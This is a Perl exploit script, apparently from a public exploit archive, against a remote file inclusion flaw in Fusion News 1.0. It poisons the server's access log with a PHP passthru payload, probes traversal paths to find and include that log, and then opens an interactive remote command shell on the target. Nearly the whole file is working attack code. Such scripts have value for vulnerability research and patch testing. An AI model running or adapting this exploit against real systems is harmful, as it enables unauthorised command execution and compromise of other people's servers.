#!/usr/bin/perl
use IO::Socket;

####################################################################################
#                                                                                  #
# Exploit coded by: X0r_1    						           #
# Bug found by:     X0r_1							   #						  
# release: 21.05.06     							   #
# 										   #
# vulnerable code in sources\post.php at lines 32-35:				   #
#----------------------------------------------------------------------------------#
#...  										   #	
#  global $VARS, $TEMPLATE, $fil_lang, $fil_config, $url_fs, $url_smil, $url_bbco; #
#  include     ($fil_config); 							   #	
#  include     ("./sources/js.db.php");   					   #	
#... 									 	   #	
#----------------------------------------------------------------------------------#
# if register_globals = On you can overwrite the var $fil_config !    		   #	
####################################################################################

print "==========================================================================\r\n";
print "|            Fusion News v.1.0 Remote File Inclusion Exploit             |\r\n";
print "|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|\r\n";  
print "|  Bug found and exploit coded by: X0r_1                                 |\r\n";   
print "|  works just with register_globals = On                                 |\r\n";       
print "==========================================================================\r\n\n\n";


###############################################################################
## !!! Ziel $server und $path von Fusion News m�ssen eingetragen werden !!!  ##
###############################################################################
$server = "127.0.0.1";
$path   = "/news/";
###############################################################################

$code  = "<?php ob_clean();echo _StaRt_;passthru(\$_GET[cmd]);echo _EnD_;die; ?>";



sub urlEncode 
{
    my ($string) = @_;
    $string =~ s/(\W)/"%" . unpack("H2", $1)/ge;
    #$string# =~ tr/.//;
    return $string;
}


sub inject
{
  $log = "no";

  print "[#]  Verbindung wird hergestellt . . .  \n";

$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$server, Timeout  => 10, PeerPort=>"http(80)")
        or die "\n[X]  es konnte keine Verbindung hergestellt werden ! \n";

  print "[#]  Verbindung hergestellt !  \n";
  print "[#]  PHP Code wird in die Log Files Injected . . .  \n";

  print $sock "GET ".$path." ".$code." HTTP/1.1\r\n";
  print $sock "Host: ".$server."\r\n";
  print $sock "Connection: close\r\n\r\n";

  print "[#]  PHP Code in Log File Injected !  \n\n";
  print "[#]  Suche nach Log File Pfad \n";

# Hier k�nnen noch mehr m�gliche Pfade zu den Server logs eingetragen werden !
#
@path= (
"../../../../../../../../../../apache/logs/access.log",
"../../../../../../../../../apache/logs/access.log",
"../../../../../../../../apache/logs/access.log",
"../../../../../../../apache/logs/access.log",
"../../../../../../apache/logs/access.log",
"../../../../../apache/logs/access.log",
"../../../../apache/logs/access.log",
"../../../apache/logs/access.log",
"../../apache/logs/access.log",
"../apache/logs/access.log",
"../../../../../../../../../logs/access.log",
"../../../../../../../../logs/access.log",
"../../../../../../../logs/access.log",
"../../../../../../logs/access.log",
"../../../../../logs/access.log",
"../../../../logs/access.log",
"../../../logs/access.log",
"../../logs/access.log",
"../logs/access.log",

);



for ($i=0; $i<=$#path; $i++)
  {
 
print "   [+] Versuche ".$path[$i]."\n";

$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$server, Timeout  => 10, PeerPort=>"http(80)")
        or die "\n[X]  es konnte keine Verbindung hergestellt werden ! \n";

  print $sock "GET ".$path."sources/post.php?fil_config=".$path[$i]."&cmd=echo%20startnow HTTP/1.1\r\n";
  print $sock "Host: ".$server."\r\n";
  print $sock "Connection: close\r\n\r\n";

$out = "";

    while ($answer = <$sock>) 
    {
    $out.=$answer;
    }
    close($sock);


if ($out =~ m/_StaRt_(.*?)_EnD_/ms)
  {
  print "\n[#] Log File Pfad gefunden ! \n\n";
  print "==========================================================================\n\n\n";
  $log = $i;
  $i = $#path

  } 
  }

if ($log eq "no")
  { print "\n\n[X] Log File Pfad konnte nicht gefunden werden ! \n\n"; exit;}

}




sub exploit
{


$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$server, Timeout  => 10, PeerPort=>"http(80)")
        or die "\n[X]  es konnte keine Verbindung hergestellt werden ! \n";

  print $sock "GET ".$path."sources/post.php?fil_config=".$path[$log]."&cmd=".&urlEncode($cmd)." HTTP/1.1\r\n";
  print $sock "Host: ".$server."\r\n";
  print $sock "Connection: close\r\n\r\n";
 

 while ($answer = <$sock>) 
{
 $v .= $answer;
}
  close($sock);

          
if ($v =~ m/_StaRt_(.*?)_EnD_/ms)
  {
   print "\n\n$1\n\n";
  }


$answer = "";
     $v = "";

&getcmd;
}




sub getcmd
{

print "\$Shell > ";
$cmd = "";
$cmd = <STDIN>;
     chop($cmd);

if (!$cmd)
 {
 print "\n>> [  Bitte geben Sie einen Befehl ein ! ]\n\n";
 &getcmd;
 }

elsif ($cmd eq "exit")
 {
 exit;
 }


&exploit
}



  &inject;
  &getcmd;

# milw0rm.com [2006-05-21]
